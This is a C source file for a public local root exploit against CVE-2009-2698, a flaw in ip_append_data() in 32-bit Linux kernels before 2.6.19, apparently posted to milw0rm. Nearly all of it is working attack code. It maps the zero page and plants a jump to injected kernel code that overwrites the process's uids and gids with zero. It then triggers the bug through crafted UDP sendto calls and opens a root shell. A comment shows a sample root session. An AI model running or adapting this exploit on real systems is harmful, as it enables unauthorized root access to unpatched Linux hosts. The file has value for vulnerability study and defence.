/*
**
** 0x82-CVE-2009-2698
** Linux kernel 2.6 < 2.6.19 (32bit) ip_append_data() local ring0 root exploit
**
** Tested White Box 4(2.6.9-5.ELsmp),
** CentOS 4.4(2.6.9-42.ELsmp), CentOS 4.5(2.6.9-55.ELsmp),
** Fedora Core 4(2.6.11-1.1369_FC4smp), Fedora Core 5(2.6.15-1.2054_FC5),
** Fedora Core 6(2.6.18-1.2798.fc6).
**
** --
** Discovered by Tavis Ormandy and Julien Tinnes of the Google Security Team.
** Thankful to them.
**
** --
** bash$ gcc -o 0x82-CVE-2009-2698 0x82-CVE-2009-2698.c && ./0x82-CVE-2009-2698
** sh-3.1# id
** uid=0(root) gid=0(root) groups=500(x82) context=user_u:system_r:unconfined_t
** sh-3.1#
** --
** exploit by <p0c73n1(at)gmail(dot)com>.
**
*/

#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <sys/personality.h>

unsigned int uid, gid;
void get_root_uid(unsigned *task)
{
	unsigned *addr=task;
	while(addr[0]!=uid||addr[1]!=uid||addr[2]!=uid||addr[3]!=uid){
		addr++;
	}
	addr[0]=addr[1]=addr[2]=addr[3]=0; /* set uids */
	addr[4]=addr[5]=addr[6]=addr[7]=0; /* set gids */
	return;
}
void exploit();
void kernel_code()
{
	asm("exploit:\n"
		"push %eax\n"
		"movl $0xfffff000,%eax\n"
		"andl %esp,%eax\n"
		"pushl (%eax)\n"
		"call get_root_uid\n"
		"addl $4,%esp\n"
		"popl %eax\n");
	return;
}
void *kernel=kernel_code;

int main(int argc, char **argv)
{
	int fd=0;
	char buf[1024];
	struct sockaddr x0x;
	void *zero_page;

	uid=getuid();
	gid=getgid();
	if(uid==0){
		fprintf(stderr,"[-] check ur uid\n");
		return -1;
	}
	if(personality(0xffffffff)==PER_SVR4){
		if(mprotect(0x00000000,0x1000,PROT_READ|PROT_WRITE|PROT_EXEC)==-1){
			perror("[-] mprotect()");
			return -1;
		}
	}
	else if((zero_page=mmap(0x00000000,0x1000,PROT_READ|PROT_WRITE|PROT_EXEC,MAP_FIXED|MAP_ANONYMOUS|MAP_PRIVATE,0,0))==MAP_FAILED){
			perror("[-] mmap()");
			return -1;
	}
	*(unsigned long *)0x0=0x90909090;
	*(char *)0x00000004=0x90; /* +1 */
	*(char *)0x00000005=0xff;
	*(char *)0x00000006=0x25;
	*(unsigned long *)0x00000007=(unsigned long)&kernel;
	*(char *)0x0000000b=0xc3;

	if((fd=socket(PF_INET,SOCK_DGRAM,0))==-1){
		perror("[-] socket()");
		return -1;
	}
	x0x.sa_family=AF_UNSPEC;
	memset(x0x.sa_data,0x82,14);
	memset((char *)buf,0,sizeof(buf));
	sendto(fd,buf,1024,MSG_PROXY|MSG_MORE,&x0x,sizeof(x0x));
	sendto(fd,buf,1024,0,&x0x,sizeof(x0x));
	if(getuid()==uid){
		printf("[-] exploit failed, try again\n");
		return -1;
	}
	close(fd);
	execl("/bin/sh","sh","-i",NULL);
	return 0;
}

/* eoc */

// milw0rm.com [2009-08-31]